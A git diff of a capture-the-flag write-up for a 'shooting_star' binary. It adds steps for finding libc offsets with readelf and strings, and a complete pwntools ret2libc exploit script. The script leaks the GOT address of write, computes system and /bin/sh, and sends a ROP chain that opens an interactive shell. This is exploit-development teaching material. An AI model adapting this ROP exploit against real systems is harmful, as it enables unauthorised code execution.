@@ -187,7 +187,7 @@ info("leaked got_write: %#x", got_write)
 
 
 22. Great! We leaked the `got_write address`.
-23. Next we need to get our `libc base address`. Let's run ldd to the binary.
+23. To get our `libc base address`. Let's run ldd to the binary.
 
 > RESULT - /lib/x86_64-linux-gnu/libc.so.6
 
@@ -196,9 +196,135 @@ info("leaked got_write: %#x", got_write)
 
 24. Then run **readelf** to get the offset of write from the libc.
 
+```
+readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep write
+```
+
 > RESULT - f8180
 
 ![image](https://user-images.githubusercontent.com/70703371/209504509-9dc79cdd-30a8-4fd4-bb06-9175bd423fd6.png)
 
 
-25. 
+25. To calculate the `libc base address` we need to substract the `address of got_write` to `write address from libc`.
+
+```
+libc_baseAddr = got_write - writeAddr_fromLibc
+```
+
+26. Next, to get the `system address` need to addition `libc_baseAddr` to `systemAddr from the libc`.
+
+```
+readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
+```
+
+> GET THE SYSTEM ADDR FROM LIBC
+
+![image](https://user-images.githubusercontent.com/70703371/209505507-0e3d375f-110a-4b32-8a51-e1e488088420.png)
+
+
+27. Now get the address of `bin/sh`.
+
+```
+strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
+```
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/209506251-c066182a-5462-469b-9ae9-e3e7d6dd2366.png)
+
+
+28. Finally we just need to build the actual payload using the `system()` address this time.
+
+```
+paddingBytes - pop_rdi - bin_sh - system_addr
+```
+
+29. So here is our final script.
+
+> FINAL SCRIPT - RET2LIBC
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.GDB:  
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  
+        return process([exe] + argv, *a, **kw)
+
+
+def find_ip(payload):
+    p = process(exe)
+    p.sendlineafter('>', '1')
+    p.sendlineafter('>>', payload)
+    p.wait() # wait for the process to crash
+
+    # Print out the address of EIP/RIP at the time of crashing
+    # ip_offset = cyclic_find(p.corefile.pc)  # x86
+    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
+    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
+    return ip_offset
+
+gdbscript = '''
+init-pwndbg
+break main
+'''.format(**locals())
+
+exe = './shooting_star'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+
+## EXPLOITATION
+
+paddingBytes = find_ip(cyclic(1024))
+
+sh = start()
+pop_rdi = 0x4012cb
+pop_rsi_r15 = 0x4012c9  
+
+payload = flat(
+    {paddingBytes: [
+        pop_rsi_r15,  # Pop the following value from stack into RSI
+        elf.got.write,  # Address of write() in GOT
+        0x0,  # Don't need anything in r15
+        elf.plt.write,  # Call plt.write() to print address of got.write()
+        elf.symbols.main  # Return to beginning of star function
+    ]}
+)
+
+sh.sendlineafter('>', '1')
+sh.sendlineafter('>>', payload)
+sh.recvuntil('May your wish come true!\n') 
+leaked_addr = sh.recv() # got the address printed out in hex
+got_write = unpack(leaked_addr[:6].ljust(8, b"\x00"))
+#info("leaked got_write: %#x", got_write)
+
+libc_base = got_write - 0xf8180
+#info("libc_base: %#x", libc_base)
+
+system_addr = libc_base + 0x4c330
+#info("system_addr: %#x", system_addr)
+
+bin_sh = libc_base + 0x196031
+#info("bin_sh: %#x", bin_sh)
+
+payload = flat(
+    {paddingBytes: [
+        pop_rdi,  
+        bin_sh, 
+        system_addr  
+    ]}
+)
+
+sh.sendline('1')
+sh.sendlineafter('>>', payload)
+sh.recvuntil('May your wish come true!\n')
+
+sh.interactive()
+
+```
